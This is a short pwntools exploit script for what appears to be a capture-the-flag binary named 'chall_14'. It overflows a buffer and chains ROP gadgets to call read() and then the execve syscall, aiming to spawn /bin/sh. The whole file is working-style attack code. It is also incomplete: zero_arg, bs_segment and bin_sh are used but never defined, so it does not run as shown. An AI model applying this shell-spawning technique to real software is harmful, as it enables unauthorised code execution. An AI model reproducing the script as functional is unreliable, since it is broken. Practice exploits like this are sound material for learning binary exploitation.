from pwn import *

p = process("./chall_14")

# canary found, NX enabled, partial relro, NO PIE

offset = 0x100 + 0x8

syscall = 0x00000000004012d3
pop_rdi = 0x00000000004018ca
pop_rdx = 0x00000000004017cf
pop_rsi_r15 = 0x00000000004018c8
pop_rax = 0x00000000004494a7

payload = cyclic(offset) 
#first ROP
payload += p64(pop_rdi) + zero_arg

#second ROP
payload += p64(pop_rsi_r15) + p64(bs_segment) + zero_arg

#bin/sh
payload += p64(pop_rdx) + p64(len(bin_sh) + 1) 

#system call
payload += p64(pop_rax) + zero_arg 
payload += p64(p.elf.sym['read'])
payload += p64(pop_rax) + p64(0x3b) 

# store /bin/sh into address
payload += p64(pop_rdi) + p64(bs_segment) 

# load 0x0 into the remaining args
payload += p64(pop_rsi_r15) + zero_arg + zero_arg 

payload += p64(pop_rdx) + zero_arg 

# call syscall
payload += p64(syscall) 

p.sendline(payload)

#Bruh